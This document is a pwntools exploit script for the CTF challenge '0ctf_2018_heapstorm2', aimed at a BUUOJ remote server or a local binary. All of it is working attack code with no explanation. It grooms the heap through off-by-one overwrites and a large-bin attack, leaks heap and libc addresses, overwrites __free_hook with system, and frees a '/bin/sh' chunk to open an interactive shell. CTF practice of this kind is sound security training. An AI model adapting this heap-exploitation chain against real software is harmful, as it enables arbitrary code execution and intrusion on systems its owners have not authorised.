from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './0ctf_2018_heapstorm2'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',25456) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(size):
    sl('1')
    ru('Size: ')
    sl('%d' % size)
    ru('Command: ')

def edit(index, content):
    sl('2')
    sla('Index: ',str(index))
    sla('Size: ', str(len(content)))
    sa('Content: ',content)
    ru('Command: ')

def free(index):
    sl('3')
    sla('Index: ',str(index))
    ru('Command: ')

def show(index):
    sl('4')
    sla('Index: ', str(index))
    m = ru('Command: ')
    pos1 = m.find(']: ') + len(']: ')
    pos2 = m.find('\n1. ')
    return m[pos1:pos2]

add(0x18) # 0
add(0x508) # 1
add(0x18) # 2
edit(1,flat('a'*0x4f0,0x500))

add(0x18) # 3
add(0x508) # 4
add(0x18) # 5
edit(4,flat('a'*0x4f0,0x500))
add(0x18) # 6

free(1)
edit(0,'a'*(0x18-12))
add(0x18) # 1
add(0x4d8) # 7
free(1)
free(2)
add(0x38) # 1
add(0x4e8) # 2

free(4)
edit(3,'a'*(0x18-12))
add(0x18) # 4
add(0x4d8) # 8
free(4)
free(5)
add(0x48) # 4

free(2)
add(0x4e8) # 2
free(2)

storage = 0x13370800
fake = storage-0x20

payload = flat(0,0,0,0x4f1,0,fake)
edit(7,payload)
payload = flat(0,0,0,0,0,0x4e1,0,fake+8,0,fake-0x18-5)
edit(8,payload)

try:
	add(0x48)
except:
	print('Try again?')

payload = flat(0,0,0,0,0,0x13377331,storage)
edit(2,payload)

payload = flat(0,0,0,0x13377331,storage,0x1000)
p1 = payload + flat(storage-0x20+3,8)
edit(0,p1)

heap = uu64(show(1))
p2 = payload + flat(heap+0x10,8)
edit(0,p2)

base = uu64(show(1))-88-libc.sym['__malloc_hook']-0x10
system = base + libc.sym['system']
free_hook = base + libc.sym['__free_hook']

p3 = payload + flat(free_hook,0x100,storage+0x50,0x100,'/bin/sh\x00')
edit(0,p3)
edit(1,p64(system))

sl('3')
sla('Index: ','2')
# end

itr()